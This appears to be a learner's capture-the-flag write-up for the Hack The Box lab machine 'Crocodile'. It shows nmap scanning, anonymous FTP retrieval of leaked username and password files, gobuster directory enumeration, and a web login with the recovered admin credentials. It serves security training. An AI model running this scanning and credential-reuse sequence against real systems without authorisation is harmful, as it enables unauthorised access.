````markdown
# Hack The Box - Crocodile

## Machine Information

| Item | Value |
|------|-------|
| Machine | Crocodile |
| Difficulty | Very Easy |
| Operating System | Linux |
| Target IP | 10.129.173.245 |

---

# Objective

- Enumerate the target.
- Discover exposed services.
- Retrieve leaked credentials from FTP.
- Enumerate the web application.
- Authenticate to the web portal.
- Retrieve the flag.

---

# Methodology

```
Reconnaissance
      │
      ▼
Port Scanning
      │
      ▼
Service Enumeration
      │
      ▼
FTP Enumeration
      │
      ▼
Credential Discovery
      │
      ▼
Web Enumeration
      │
      ▼
Authentication
      │
      ▼
Retrieve Flag
```

---

# 1. Reconnaissance

## Full TCP Scan

Command

```bash
sudo nmap -Pn -p- --min-rate 5000 -v 10.129.173.245 | tee nmap.txt
```

## Service Detection

```bash
nmap -Pn -sV -p 21,80 10.129.173.245
```

Result

```text
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

---

# Analysis

Two services are exposed.

```
FTP
```

Possible attack surface:

- Anonymous login
- Configuration files
- Backup files
- Credentials

```
HTTP
```

Possible attack surface:

- Login page
- Admin panel
- Hidden directories
- Web application

---

# 2. FTP Enumeration

Connect to FTP.

```bash
ftp 10.129.173.245
```

Username

```text
anonymous
```

Password

```
<Press Enter>
```

Login successful.

---

List files.

```text
ls
```

Result

```text
allowed.userlist
allowed.userlist.passwd
```

---

## Download Files

The default FTP client failed to save files locally.

Error

```text
ftp: Can't open 'allowed.userlist': Permission denied
```

Instead, use curl.

```bash
curl -O ftp://anonymous:@10.129.173.245/allowed.userlist

curl -O ftp://anonymous:@10.129.173.245/allowed.userlist.passwd
```

---

## Read Credentials

```bash
cat allowed.userlist
```

Output

```text
aron
pwnmeow
egotisticalsw
admin
```

---

```bash
cat allowed.userlist.passwd
```

Output

```text
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

---

# Analysis

Two files leaked authentication information.

The usernames and passwords are stored in matching order.

| Username | Password |
|----------|----------|
| aron | root |
| pwnmeow | Supersecretpassword1 |
| egotisticalsw | @BaASD&9032123sADS |
| admin | rKXM59ESxesUFHAd |

---

# 3. Web Enumeration

Run Gobuster.

```bash
gobuster dir \
-u http://10.129.173.245 \
-w /snap/seclists/current/Discovery/Web-Content/common.txt \
-x php \
-t 50 \
-o gobuster.txt
```

---

## Gobuster Results

```text
assets               301
config.php           200
css                  301
dashboard            301
fonts                301
index.html           200
js                   301
login.php            200
logout.php           302
server-status        403
```

---

# Analysis

## login.php

```
200 OK
```

A login page exists.

---

## dashboard/

```
301
```

Directory exists.

Likely requires authentication.

---

## config.php

```
200 OK

Size: 0
```

PHP scripts execute on the server.

The source code is not exposed.

A zero-byte response does **not** mean the file is empty.

---

## server-status

```
403
```

Apache server-status exists but access is denied.

---

## .htaccess / .htpasswd

```
403
```

Configuration files exist.

Apache correctly blocks direct access.

---

# 4. Authentication

Open

```
http://10.129.173.245/login.php
```

Use credentials obtained from FTP.

Successful login

Username

```text
admin
```

Password

```text
rKXM59ESxesUFHAd
```

Access granted.

Retrieve the flag.

---

# Gobuster Explained

Gobuster performs a dictionary attack against URLs.

Example

Wordlist

```text
admin
login
config
```

Command

```bash
-x php
```

Gobuster generates

```text
/admin
/admin.php

/login
/login.php

/config
/config.php
```

Each request is sent to the web server and analyzed using HTTP status codes.

---

# HTTP Status Codes Learned

## 200

```
OK
```

The resource exists.

---

## 301

```
Moved Permanently
```

Usually redirects to a directory ending with `/`.

---

## 302

```
Temporary Redirect
```

Often redirects unauthenticated users.

---

## 403

```
Forbidden
```

The resource exists but access is denied.

---

## 404

```
Not Found
```

The resource does not exist.

---

# Gobuster Options Learned

## Basic

```bash
gobuster dir \
-u http://TARGET \
-w WORDLIST
```

---

## PHP Enumeration

```bash
-x php
```

Attempts both

```text
admin

admin.php
```

---

## Threads

```bash
-t 50
```

Uses 50 concurrent requests.

Threads increase speed but do not increase the number of requests.

---

## Output

```bash
-o gobuster.txt
```

Save scan results.

---

# Attack Workflow

```
Nmap
    │
    ▼
FTP Service
    │
    ▼
Anonymous Login
    │
    ▼
Download Credential Files
    │
    ▼
Analyze Credentials
    │
    ▼
HTTP Enumeration
    │
    ▼
Discover login.php
    │
    ▼
Authenticate
    │
    ▼
Retrieve Flag
```

---

# Concepts Learned

## Pivoting

Information obtained from one service was used to compromise another.

```
FTP
    │
Credentials
    │
    ▼
HTTP Login
```

---

## Information Disclosure

Sensitive files were exposed through anonymous FTP access.

This allowed an attacker to obtain valid application credentials.

---

## Fingerprinting

Before using

```bash
-x php
```

Identify the technology.

Possible methods:

- Nmap
- Browser
- URL
- HTTP Headers
- WhatWeb
- Wappalyzer

---

## Enumeration Before Exploitation

Correct workflow

```
Discover Services

↓

Enumerate

↓

Analyze

↓

Identify Weakness

↓

Exploit
```

---

# Tools Used

- Nmap
- FTP
- curl
- Gobuster
- Web Browser

---

# Skills Gained

- FTP Enumeration
- Anonymous FTP
- Credential Discovery
- Information Disclosure
- Gobuster
- Directory Enumeration
- HTTP Status Code Analysis
- Web Authentication
- Pivoting
- Fingerprinting
- Attack Surface Enumeration

---

# Lessons Learned

- Anonymous FTP can expose sensitive information.
- Credentials found in one service may compromise another.
- Gobuster discovers hidden directories and files.
- HTTP status codes reveal valuable information.
- PHP files execute on the server rather than exposing source code.
- Enumeration should always precede exploitation.
- Understanding the technology stack helps choose the correct Gobuster extensions.

---

# Machine Summary

| Category | Result |
|----------|--------|
| Target | 10.129.173.245 |
| Services | FTP, HTTP |
| FTP Access | Anonymous |
| Credentials Found | Yes |
| Web Login | Successful |
| Enumeration Tool | Gobuster |
| Flag Retrieved | ✅ |
| Machine Status | Completed |
````
